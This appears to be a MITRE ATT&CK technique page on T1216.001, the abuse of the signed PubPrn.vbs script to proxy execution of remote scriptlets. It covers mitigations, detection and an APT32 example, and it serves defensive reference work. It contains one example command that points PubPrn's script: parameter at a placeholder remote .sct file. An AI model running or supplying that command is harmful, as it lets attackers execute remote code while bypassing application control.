# T1216.001 - PubPrn

[Enterprise](../../../../README.md) / [Stealth](../../README.md) / [T1216 - System Script Proxy Execution](../README.md)

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)

Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.

In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

[MITRE ATT&CK record](https://attack.mitre.org/techniques/T1216/001)

**Tactics**  [Stealth](../../README.md)

**Platforms**  [Windows](../../../../Platforms/Windows.md)

## Procedure examples

- [G0050 - APT32](../../../../Threat%20Intelligence/Groups/G0050%20-%20APT32.md) — [APT32](https://attack.mitre.org/groups/G0050) has used PubPrn.vbs within execution scripts to execute malware, possibly bypassing defenses.(Citation: Twitter ItsReallyNick Status Update APT32 PubPrn) [Twitter ItsReallyNick Status Update APT32 PubPrn](https://x.com/ItsReallyNick/status/944321013084573697)

## Mitigations

- [M1040 - Behavior Prevention on Endpoint](../../../../Defenses/Mitigations/M1040%20-%20Behavior%20Prevention%20on%20Endpoint.md) — On Windows 10, update Windows Defender Application Control policies to include rules that block the older, vulnerable versions of PubPrn.(Citation: Microsoft_rec_block_rules) [Microsoft_rec_block_rules](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules)
- [M1038 - Execution Prevention](../../../../Defenses/Mitigations/M1038%20-%20Execution%20Prevention.md) — Certain signed scripts that can be used to execute other programs may not be necessary within a given environment. Use application control configured to block execution of these scripts if they are not required for a given system or network to prevent potential misuse by adversaries.

## Detection strategies

- [DET0528 - Detecting Remote Script Proxy Execution via PubPrn.vbs](../../../../Defenses/Detection%20Strategies/DET0528%20-%20Detecting%20Remote%20Script%20Proxy%20Execution%20via%20PubPrn.vbs.md)

## Sources

- [pubprn](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn)
- [Enigma0x3 PubPrn Bypass](https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/)
